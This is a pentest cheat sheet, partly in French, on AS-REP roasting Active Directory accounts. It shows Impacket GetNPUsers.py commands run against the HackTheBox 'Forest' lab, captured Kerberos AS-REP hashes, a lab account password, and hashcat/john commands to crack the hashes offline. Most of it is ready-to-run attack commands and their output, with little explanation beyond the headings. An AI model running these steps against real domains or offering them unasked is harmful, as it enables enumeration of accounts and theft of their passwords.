# AS_REP

## check ASREPRoast for a list of users (no credentials required)
##  marche pour les objet AD sans pr√©-authentification


python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

exemple:
/usr/share/doc/python3-impacket/examples/GetNPUsers.py HTB.local/ -usersfile ./list.txt -dc-ip 10.10.10.161
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User Sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User Lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$svc-alfresco@HTB.LOCAL:0f8b748c0c7d0a6ff02fa17a749ba128$ccacb6c97be0a844b6890b88bc97cd27b6798396bf2c3e64c773f25f257c000c6f2cc4301b2d97c24a4a752bbbbe1754a4238585dcac082206e021439994f2d7e46dfb24a7189417de710ad4f495aa1b19ee9e443d58aa275f95e3e9df419551fa4ba2b77dd260edae5112d49a4e6bb5f99597adc891d12ff54c1be1cef600eaee164a2a674093fc0bd02540b40f96d44a6e44f4cf4d66c9c8a3cd883994e599c55aaa91264f3acd2fd257943aaacf2462cc68d274940cc7530829b9b23c6e144a5915514d6e55a02752199aa9df813f1104798188d8788122acf982b85a4c6995a3b272956b
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User Andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User Mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User Santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)


## Cracking with dictionary of passwords:

hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>

john --wordlist=<passwords_file> <AS_REP_responses_file>





## check ASREPRoast for all domain users (credentials required)
python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>



/usr/share/doc/python3-impacket/examples/GetNPUsers.py -request HTB.local/svc-alfresco:s3rvice -dc-ip 10.10.10.161
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2019-10-16 16:33:13.197703  2019-10-16 16:31:50.994383  0x410200 



$krb5asrep$23$svc-alfresco@HTB.LOCAL:b56acf6c68e5a4cecbee05233e672ad1$c883d417090944cd8261b42e3c69e1818ea72d2fbfd6195a2d3e22aaaa6d69dca0e16d5899bfc66ac868a2b3d2bb69d9f500b711ce74ccf671eb688fb8da20fec9a9183cd776ead51cddfb7b30cd713a498144f86c8072db7799d907f35008aeb007bce2a0e299354860f9e0ef18c8d3e5b31ff1668b8cb55f8614fa8a35ad56faeac5f1503cb079e3db6e8337aaa401fddb6361c156e8d34bb828eb4ebedb52878b94dceedb74a4fdd3ecd313d6868430bab82ad75124a9fd022c7ecc123ca33ef4a58f647c01d7f48aef89b8aaa33d6f29d9d151a386a3a9f3b0f0829a657954fdce800cb1


